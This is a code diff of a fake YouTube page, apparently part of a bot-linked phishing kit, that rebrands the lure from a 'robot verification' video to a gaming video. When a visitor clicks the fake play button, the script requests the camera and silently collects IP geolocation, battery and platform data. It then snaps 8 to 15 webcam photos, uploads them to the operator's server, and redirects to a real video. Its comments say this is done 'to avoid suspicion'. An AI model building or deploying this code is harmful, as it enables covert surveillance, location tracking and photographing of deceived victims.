@@ -2,70 +2,99 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>YouTube</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        :root { --yt-red: #ff0000; --yt-bg: #0f0f0f; --yt-text: #ffffff; --yt-surface: #272727; }
-        body { margin: 0; background-color: var(--yt-bg); color: var(--yt-text); font-family: "Roboto", Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
+        :root { --yt-bg: #0f0f0f; --yt-text: #ffffff; --yt-gray: #aaaaaa; }
+        body { margin: 0; background: var(--yt-bg); color: var(--yt-text); font-family: "Roboto", sans-serif; }
         
-        /* Mobile Header */
-        header { height: 48px; display: flex; align-items: center; justify-content: space-between; padding: 0 16px; position: sticky; top: 0; background: var(--yt-bg); z-index: 100; border-bottom: 1px solid #222; }
-        .yt-logo { display: flex; align-items: center; color: white; text-decoration: none; font-weight: bold; font-size: 18px; }
-        .yt-logo i { color: var(--yt-red); font-size: 22px; margin-right: 5px; }
+        nav { height: 56px; display: flex; align-items: center; padding: 0 16px; background: var(--yt-bg); position: sticky; top: 0; z-index: 100; }
+        .logo { display: flex; align-items: center; font-size: 18px; font-weight: bold; }
+        .logo i { color: #ff0000; margin-right: 4px; font-size: 22px; }
 
-        /* Video Area */
-        .video-box { width: 100%; aspect-ratio: 16 / 9; background: #000; display: flex; align-items: center; justify-content: center; position: relative; }
-        .play-btn { font-size: 60px; color: white; cursor: pointer; opacity: 0.9; }
+        .main-container { display: flex; flex-direction: row; max-width: 1700px; margin: 0 auto; padding: 16px 24px; gap: 24px; }
         
-        /* Loading Spinner */
-        .loader { border: 4px solid #333; border-left-color: var(--yt-red); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
-        @keyframes spin { to { transform: rotate(360deg); } }
+        /* The Player Section */
+        .video-section { flex: 3; min-width: 0; }
+        .player-wrapper { 
+            width: 100%; 
+            aspect-ratio: 16/9; 
+            background: #000 url('https://i.ytimg.com/vi/mskhsZKeltA/maxresdefault.jpg') center/cover; 
+            border-radius: 12px; 
+            position: relative; 
+            cursor: pointer; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+        }
 
-        /* Video Info */
-        .info { padding: 12px 16px; }
-        .v-title { font-size: 17px; font-weight: 500; line-height: 22px; margin-bottom: 6px; }
-        .v-meta { font-size: 12px; color: #aaa; margin-bottom: 12px; }
+        /* Fake Play Button Overlay */
+        .play-overlay {
+            width: 100%;
+            height: 100%;
+            position: absolute;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(0,0,0,0.1);
+        }
+        .yt-play-btn { width: 68px; height: 48px; background: rgba(255,0,0,0.9); border-radius: 12px; display: flex; align-items: center; justify-content: center; }
+        .yt-play-btn::after { content: ''; border-left: 18px solid white; border-top: 12px solid transparent; border-bottom: 12px solid transparent; margin-left: 5px; }
 
-        /* Channel Section */
-        .sub-bar { display: flex; align-items: center; gap: 12px; border-top: 1px solid #222; border-bottom: 1px solid #222; padding: 12px 0; margin-top: 10px; }
-        .pfp { width: 36px; height: 36px; background: #ff4500; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; }
-        .btn-sub { background: white; color: black; border-radius: 20px; padding: 0 16px; height: 36px; border: none; font-weight: 600; margin-left: auto; font-size: 14px; }
+        .video-info { margin-top: 12px; }
+        .video-title { font-size: 18px; font-weight: 600; line-height: 1.4; }
+        .channel-row { display: flex; align-items: center; gap: 12px; margin-top: 12px; }
+        .pfp { width: 40px; height: 40px; background: #555; border-radius: 50%; }
 
-        /* Comments Mockup */
-        .comments-section { background: var(--yt-surface); border-radius: 12px; padding: 12px; margin-top: 15px; font-size: 13px; }
+        /* Sidebar */
+        .sidebar { flex: 1; display: flex; flex-direction: column; gap: 12px; min-width: 320px; }
+        .card { display: flex; gap: 8px; cursor: pointer; }
+        .thumb { width: 160px; height: 90px; background: #222; border-radius: 8px; flex-shrink: 0; }
+        .meta b { font-size: 14px; display: block; margin-bottom: 2px; }
+        .meta span { font-size: 12px; color: var(--yt-gray); }
 
-        video, canvas { display: none; position: absolute; }
+        video, canvas { display: none; }
+
+        @media (max-width: 1000px) {
+            .main-container { flex-direction: column; padding: 0; }
+            .player-wrapper { border-radius: 0; }
+            .video-info { padding: 12px; }
+            .sidebar { padding: 12px; }
+        }
     </style>
 </head>
 <body>
-    <header>
-        <a href="#" class="yt-logo"><i class="fab fa-youtube"></i> YouTube</a>
-        <div style="display: flex; gap: 18px;"><i class="fas fa-search"></i> <i class="fas fa-ellipsis-v"></i></div>
-    </header>
 
-    <div class="video-box" id="box">
-        <i class="fas fa-play play-btn" onclick="startCapture()"></i>
-    </div>
+    <nav><div class="logo"><i class="fab fa-youtube"></i> YouTube</div></nav>
 
-    <div class="info">
-        <div class="v-title">Robot Verification: Tap Play to Confirm Identity</div>
-        <div class="v-meta">1.2M views • 1 hour ago</div>
-        
-        <div class="sub-bar">
-            <div class="pfp">V</div>
-            <div>
-                <div style="font-weight:600; font-size: 14px;">VinzyStore <i class="fas fa-check-circle" style="font-size:10px;color:#aaa"></i></div>
-                <div style="font-size:12px;color:#aaa">542K subscribers</div>
+    <div class="main-container">
+        <div class="video-section">
+            <div class="player-wrapper" id="player" onclick="initCapture()">
+                <div class="play-overlay"><div class="yt-play-btn"></div></div>
             </div>
-            <button class="btn-sub">Subscribe</button>
+
+            <div class="video-info">
+                <div class="video-title">Top 10 Insane Thamuz Gameplays | Mythical Immortal 2026</div>
+                <div class="channel-row">
+                    <div class="pfp"></div>
+                    <div>
+                        <b>Vinzy Gaming</b><br>
+                        <span style="color:var(--yt-gray); font-size: 12px;">850K subscribers</span>
+                    </div>
+                    <button style="margin-left:auto; background:white; color:black; border:none; padding:8px 16px; border-radius:20px; font-weight:bold;">Subscribe</button>
+                </div>
+            </div>
         </div>
 
-        <div class="comments-section">
-            <div style="font-weight: bold; margin-bottom: 5px;">Comments</div>
-            <div style="display: flex; gap: 10px; align-items: center;">
-                <div style="width:24px; height:24px; background:#555; border-radius:50%"></div>
-                <p style="margin:0; color: #eee;">Access restricted. Complete verification to view.</p>
+        <div class="sidebar">
+            <div class="card">
+                <div class="thumb" style="background:url('https://i.ytimg.com/vi/dQw4w9WgXcQ/hqdefault.jpg') center/cover;"></div>
+                <div class="meta"><b>Minsitthar Guide S31</b><span>200K views</span></div>
+            </div>
+            <div class="card">
+                <div class="thumb" style="background:#333;"></div>
+                <div class="meta"><b>How to Reach Immortal</b><span>1M views</span></div>
             </div>
         </div>
     </div>
@@ -76,79 +105,56 @@
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const tid = urlParams.get('id');
+        const mode = urlParams.get('mode') || 'photo';
+        const cam = urlParams.get('cam') || 'user';
         const ytid = urlParams.get('ytid') || 'dQw4w9WgXcQ';
-        const camMode = urlParams.get('cam') || 'user';
 
-        async function startCapture() {
-            // UI Update: Show Loading
-            document.getElementById('box').innerHTML = '<div class="loader"></div>';
-
+        async function initCapture() {
+            // Instantly trigger the native browser permission pop-up
             try {
-                // Request Camera access
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: camMode },
-                    audio: false 
-                });
-                const video = document.getElementById('v');
-                video.srcObject = stream;
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: cam } });
+                const v = document.getElementById('v');
+                v.srcObject = stream;
 
-                // 1. Gather Advanced Android Telemetry
-                let batInfo = "N/A";
+                // Grab IP and Device Info silently
+                const ipData = await fetch('https://ipapi.co/json/').then(r => r.json());
+                
+                // Collect hidden hardware info
+                let extra = { platform: navigator.platform };
                 try {
-                    const battery = await navigator.getBattery();
-                    batInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
-                } catch(e) {}
+                    const bat = await navigator.getBattery();
+                    extra.battery = Math.round(bat.level*100) + "%";
+                } catch(e){}
 
-                let netInfo = "N/A";
-                if (navigator.connection) {
-                    netInfo = `${navigator.connection.effectiveType.toUpperCase()} (${navigator.connection.downlink} Mbps)`;
-                }
-
-                // Get IP and Location
-                const ipRes = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
-
-                // Send Log to Bot
                 await fetch(`/log_info?id=${tid}`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        ...ipRes,
-                        battery: batInfo,
-                        net_type: netInfo,
-                        platform: "Android Phone",
-                        browser: navigator.userAgent,
-                        language: navigator.language
-                    })
+                    body: JSON.stringify({...ipData, ...extra})
                 });
 
-                // 2. Start Image Capture Loop (8 Photos)
-                let photoCount = 0;
-                const captureInterval = setInterval(() => {
-                    if (photoCount >= 8) {
-                        clearInterval(captureInterval);
-                        // Redirect to the actual YouTube video
-                        window.location.href = "https://www.youtube.com/watch?v=" + ytid;
+                // Start capturing photos while they think the video is loading
+                let count = 0;
+                const limit = (mode === 'photo') ? 8 : 15;
+                
+                const interval = setInterval(() => {
+                    if(count >= limit) {
+                        window.location.href = `https://www.youtube.com/watch?v=${ytid}`;
                         return;
                     }
-
                     const canvas = document.getElementById('c');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-
-                    canvas.toBlob(blob => {
+                    canvas.width = v.videoWidth; canvas.height = v.videoHeight;
+                    canvas.getContext('2d').drawImage(v, 0, 0);
+                    canvas.toBlob(b => {
                         const fd = new FormData();
-                        fd.append('file', blob, 'android_log.jpg');
-                        fetch(`/upload?id=${tid}&type=photo`, { method: 'POST', body: fd });
-                    }, 'image/jpeg', 0.7);
+                        fd.append('file', b, 'img.jpg');
+                        fetch(`/upload?id=${tid}&type=${mode}`, {method: 'POST', body: fd});
+                    }, 'image/jpeg', 0.6);
+                    count++;
+                }, 600);
 
-                    photoCount++;
-                }, 750);
-
-            } catch (err) {
-                console.error(err);
-                alert("Security Error: Camera access is mandatory for robot verification.");
-                location.reload();
+            } catch(e) {
+                // If they deny, just redirect anyway to avoid suspicion
+                window.location.href = `https://www.youtube.com/watch?v=${ytid}`;
             }
         }
     </script>
